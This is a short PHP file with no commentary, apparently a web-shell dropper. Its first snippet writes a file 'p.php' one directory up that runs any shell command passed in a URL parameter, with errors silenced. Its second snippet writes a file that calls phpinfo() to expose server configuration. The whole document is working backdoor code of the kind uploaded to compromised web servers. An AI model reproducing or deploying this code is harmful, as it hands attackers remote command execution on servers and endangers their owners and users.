<?php
fputs(fopen('../p.php','w'),'<?php @system($_GET[a]); ?>')
?>


<?php
$fp=fopen('cmd1.php','w');
fwrite($fp,'<?php phpinfo(); ?>');
fclose($fp);
?>